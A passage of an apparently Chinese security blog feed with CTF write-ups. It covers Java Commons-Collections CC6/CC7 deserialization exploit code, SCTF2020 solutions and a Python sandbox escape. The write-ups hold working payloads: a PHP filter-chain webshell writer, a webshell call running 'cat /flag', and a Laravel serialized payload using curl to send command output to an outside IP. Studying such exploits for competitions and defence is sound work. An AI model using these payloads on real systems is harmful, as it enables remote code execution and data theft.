class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">"byc"</span>);</span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        innerMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(hashMap);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样也是cc依赖3,4通用。</p><p>然后强网杯当时一道java题记得就是用的cc6的链子改了下。因为当时是存在手写的黑名单，不能用hashmap,但是可以找替代的hashcode来利用。所以用HashBag替换一下就行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashBag hashMap = <span class="keyword">new</span> HashBag();</span><br><span class="line">hashMap.add(tiedMapEntry, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>hashBag继承了一个抽象类,然后方法基本跟HashMap差不多。所以小改下就可以直接打了。</p><ul><li>CommonsCollections7</li></ul><p>cc7的链子是通过AbstractMap#equals来触发LazyMap#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果控制m为lazymap即可触发rce.</p><p>然后cc7是在HashTable#reconstitutionPut中调用过equals方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>然后HashTable的readObject也调用过了reconstitutionPut.所以可以触发。</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap1 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap1.put(<span class="string">"yy"</span>, <span class="string">"1"</span>); <span class="comment">// "yy".hashCode() == "zZ".hashCode() == 3872</span></span><br><span class="line">        HashMap innerMap2 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap2.put(<span class="string">"zZ"</span>, <span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(lazyMap1, <span class="string">"placeholder"</span>);</span><br><span class="line">        hashMap.put(lazyMap2, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        innerMap1.remove(<span class="string">"zZ"</span>); </span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); </span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(hashMap);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个细节。就是首先需要put两次才能调用equals方法。<br>然后由于一个小bug</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"yy"</span>.hashCode() == <span class="string">"zZ"</span>.hashCode()</span><br></pre></td></tr></table></figure><p>会导致”碰撞”发生，其实就是因为这样计算出来的hash一致所以会导致它调用其中一个对象的equals方法进行比较。这样就能成功进入我们的gadget了。最后expremove掉zZ这第二个元素。这是要去掉这个键。否则这个hashmap会带上无法序列化的对象从而使反序列化失败。</p><ul><li>summary</li></ul><p>没想到最后还是成功把链子都跟完了。这篇文章就写这么多了。反序列化的gadget跟进说实话比起php少了一点变通，但是难度还是有点大的。不过整体下来不难发现Map类,cc库中的一系列Transformer类，反射的技巧起到了至关重要的作用。并且实际上肯定存在更多gadget等待发掘。</p><p>后面会抽空去学习下shiro,jackson,fastjson等等的深度分析。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Travel</title>
      <link href="2020/07/07/hackthebox-Travel/"/>
      <url>2020/07/07/hackthebox-Travel/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4bb4f8e52d4f922c7a6c926edb2699f37922141cf5f15e05553b80ce8f6c921d"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020 writeup</title>
      <link href="2020/07/05/SCTF2020-writeup/"/>
      <url>2020/07/05/SCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>越打越菜 :(<br>这次比赛难度相比上次RCTF的难度好了点。但是最后还是只能感慨自己tcl。做出来的只有CloudDisk跟UnsafeDefenseSystem.相比下solve比较多的pythonsandbox自己反而因为总觉得pyjail太老套不去研究,连下手都做不到……赛后还是把能复现的都复现下吧。</p><a id="more"></a><h1 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h1><p>Nodejs经典漏洞。其实因为最近练手出了些Nodejs的题目,现在感觉Node写起来巨舒服,估计暑假会长期练手一些node项目。</p><p>首先先不说题目本身,单从最近写nodejs应用express入手，发现express框架一个启用支持数据的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br></pre></td></tr></table></figure><p>这里是表示我们的应用支持<code>application/json</code>跟<code>application/x-www-form-urlencoded</code>传输的数据.相信在post包时见过不少次了。而让我注意到这个问题的起因是在一次CTF比赛中。本来那题是Nodejs反序列化作为考点，但是我开始在随意测试时发现了另一个漏洞，不过因为不是正确思路就没深入。后来getshell时把源码拿下来仔细阅读，发现问题就是出在这上面。对于Nodejs而言,传输json数据是非常危险的一件事。因为Nodejs本身就是js的一个runtime环境,javascript的对象写法就是<code>{&quot;sth&quot;:&quot;byc&quot;}</code>之类的。而json数据与这的格式一致性往往导致传输的数据会被进行混淆。一旦程序写法有了问题，就可能误取某个用户传输的值作为对象的属性，导致原型链污染，变量混淆，Nosql注入之类的。</p><p>回到题目。由于有源码,所以直接上手分析。当然由于Nodejs的特性，以及本题所执行的上传下载的过程,在依赖正常的情况下不可能出现注入，路径穿越之类的问题。只可能是文件读取了。那么问题出在哪呢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> file = ctx.request.body.files.file;</span><br><span class="line"><span class="keyword">const</span> reader = fs.createReadStream(file.path);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> upStream = fs.createWriteStream(filePath);</span><br></pre></td></tr></table></figure><p>注意这里,它的取值是从ctx.request.body中取的。而这就有可能出现上面提到的问题。假如我们传输json数据files并置其path属性为任意文件。我们之后下载的文件就是服务器上的文件了。</p><p>故读取之</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"files"</span>:&#123;<span class="attr">"file"</span>:&#123;<span class="attr">"path"</span>:<span class="string">"/app/flag"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/05/SCTF2020-writeup/0.PNG" alt></p><p>后来根据队友教的应该是个koa-body的问题。难怪我本地当时连上传都跑不起来。因为是个2.x版本的koa.出题人不给package.json估计是怕一眼看出版本问题吧。</p><h1 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h1><p>说真的。这题这次真的是心态起伏最大的一题。说实话我们本来有拿下一血的机会的。结果因为小细节就导致自己浪费了数个小时。第一天晚上9点左右我们就已经在打tp5.0.24的反序列化了。结果一直就以失败告终,第二天才终于明白问题不是出在exp上.具体后面再说吧。</p><p>老实说这题整体脉络下来跟我平时渗透的思路很相似，所以在前面进度非常顺利，没有卡壳。</p><p>第一步是访问网址。发现作了个跳转。同时提醒了<strong>log.txt</strong>的存在.(就是因为我看掉了log.txt导致后面浪费的巨量时间，该打)</p><p>因为跳转到<code>/public/test</code>。所以直接访问这个路由。得到一个网页。随便点点后似乎是静态的。这时候果断切ctrl+u看源码,并且ctrl+f搜索php。看有没有动态文件存在。<br>果然在注释中找到了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Admin:/public/nationalsb/login.php --&gt;</span></span><br></pre></td></tr></table></figure><p>访问后发现是个auth的登录。但是任意用户密码都能进。不过毕竟我们收获了一个新路由<code>/public/nationalsb/</code>果断去这看看。</p><p>同样还是直接看网页源码,发现功能又是个静态的。但是有个js文件。点进去收获提示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/username:Admin1964752</span><br><span class="line">//password:DsaPPPP!@#amspe****</span><br><span class="line">//Secret **** is your birthday</span><br></pre></td></tr></table></figure><p>显然密码后四位要爆破。随便写个脚本出后四位好了。这种爆破量相比之前hackthebox的量已经非常友好。</p><p>最后爆出密码后缀1221.登录时的内容提示我们可以postfile.实验后是个lfi.不过显然做了处理，不能读取<code>/flag</code>跟带有log的(这里我以为是ban了login,但后来发现是ban了log…).那么基于这是个tp5.0.24.果断dump源码好了</p><p>现场下了个tp5.0.24的源码。最重要的肯定是控制器源码。所以读取<code>application/index/controller/Index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#r=requests.get(un_url+tmp_unserialize_payload)</span></span><br><span class="line">r=requests.get(un_url+unserialize_payload)</span><br><span class="line">r=requests.post(<span class="string">'http://39.99.41.124/public/3b58a9545013e88c7186db11bb158c44.php'</span>,data=&#123;</span><br><span class="line">    <span class="string">'ccc'</span>:<span class="string">"system('cat /flag');"</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>最后再回过头解释下使用过滤器的原因吧。因为之前郁师傅实战中遇到了，所以有这两个坑点</p><ul><li>short open tag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc</span><br><span class="line">&#x2F;&#x2F;000000000000</span><br><span class="line"> rkvg();?&gt;</span><br><span class="line">报错 Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING)</span><br></pre></td></tr></table></figure>因为默认支持短标签的原因，由于 &lt;?cuc，也就是 &lt;?后面出现了 cuc 字符串，使得代码语法不合格，php 报错退出执行。</li></ul><p>因此,要素其实就是绕过这个exit()。要想<code>&lt;,?</code>不被识别。我们可以用string.strip_tags过滤器来解决。但是要让shell代码<code>&lt;?php eval(xxx)</code>不被过滤。我们可以用convert.base64-decode过滤器来解决。所以要素就是两种过滤器搭配。但是这里需要解决的最重要的问题，就是base64解释器遇到等号就直接结束了。所以还要想办法让文件名中不出现<code>=</code>.</p><p>这里就可以使用php默认支持的iconv过滤器。优势在于，我们可以直接使用iconv这个shell命令支持的所有编码进行转换。<br>而之前我们在各种比赛中应该也接触过转码为utf-7的webshell了。比如XNUCA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cc&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;123.txt&#39;;</span><br><span class="line">file_put_contents($cc,&#39;&#x3D;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">123.txt 写入的内容为: +AD0-</span><br><span class="line">**&#x2F;</span><br></pre></td></tr></table></figure><p>+AD0-可以被base64过滤器解码,所以说我们就能成功写入shell了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure><p>而且生成的文件名不会像rot13那样有奇怪的前缀。我们直接得到md5作为文件名的php。(值取决于你的file类中的$tag值,很多exp里就是true.所以算md5(‘tag_’+md5(‘1’))就行了)</p><p>当然因为base64是8byte解码。实际需要根据自己的payload补足a.当然最多补足4个就行。所以FUZZ下就能解决问题<br><img src="/2020/07/05/SCTF2020-writeup/2.PNG" alt></p><p>所以说真的拉胯。还靠着郁师傅的老本以为占尽先机。却因为一些小细节走入误区。可能这就是渗透吧。</p><h1 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h1><p>我要是审过laravel5.8RCE以外的链子会是这个吊样.jpg…..第五空间的laravel因为审过链子所以直接秒了。这个因为没审过看都没看懂,属实拉胯。</p><p>其实就是CVE-2018-15133.因为.env里给了key所以就能直接打。<br>payload可以用第五空间的payload。因为以前在php框架练习中护网杯的非预期里提过这个链子了。所以就不深谈了。然后第五空间就是改了一个类的destruct。换了另一个类的destruct还能触发__get。这里可以用两个类都能用。</p><p>payload用ggc生成挺省事的。当然直接用之前rceexp的也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:&#123;s:9:&quot;*events&quot;;O:28:&quot;Illuminate\Events\Dispatcher&quot;:1:&#123;s:12:&quot;*listeners&quot;;a:1:&#123;s:28:&quot;curl 120.27.246.202&#x2F;&#96;whoami&#96;&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;&#125;s:8:&quot;*event&quot;;s:28:&quot;curl xxxxx&#x2F;&#96;cat &#x2F;flag&#96;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>base64后联合key送给某cvephp即可。当然也能直接调用生成。<br>其他战队大佬的wp写的肯定比我好。我就不放exp了。</p><p><img src="/2020/07/05/SCTF2020-writeup/3.PNG" alt></p><p>看到预期解是通过覆盖session反序列化。这就能解释index的路由设置了。可惜了本来一个很难绕过的题都被大家利用框架的洞打成RCE了……</p><h1 id="pysandbox-1-amp-2"><a href="#pysandbox-1-amp-2" class="headerlink" title="pysandbox 1&amp;2"></a>pysandbox 1&amp;2</h1><p>题目虽然是沙盒逃逸。但其实用的exp自己之前也用过.看官方wp用的当初tokyowestern的脚本倒是挺惊讶的。因为自己前不久做安恒比赛时也用过shrine那题的脚本。总之就是能直接fuzz出一条继承链，相当好用。</p><p>先来学习下dalao们的设置静态目录的做法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?POST&#x3D;%2f</span><br><span class="line"></span><br><span class="line">cmd&#x3D;app.static_folder&#x3D;request.args[request.method]</span><br></pre></td></tr></table></figure><p>设置静态目录为<code>/</code><br>之后即可访问<code>static/flag</code><br><img src="/2020/07/05/SCTF2020-writeup/4.PNG" alt></p><p>然后就是RCE了。这里其实自己之前FUZZ过一次。就是用shrine那个脚本fuzz出一条获取app的链。</p><p>当然这里看到一个很简单的方法。分享下W4nder师傅的<br><a href="http://phoebe233.cn/index.php/archives/53/#pysandbox2" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/53/#pysandbox2</a><br>因为ord是在builtins里的。所以我们可以直接覆盖。之后同理再覆盖掉路由函数。利用lambda匿名函数。非常巧妙。<br><img src="/2020/07/05/SCTF2020-writeup/5.PNG" alt></p><p>如果是官方的思路,跟我一开始的想法应该差不多。道理就是函数劫持。当然前提是能获取到可控变量的模块。出题人找的是werkzeug.urls.url_parse。这里我也用shrine当时的脚本来fuzz下。</p><p>search.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">(obj, path=<span class="string">'obj'</span>, depth=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            print(obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># attributes</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) <span class="keyword">and</span> name.endswith(<span class="string">'__'</span>):</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</span><br><span class="line">                                 <span 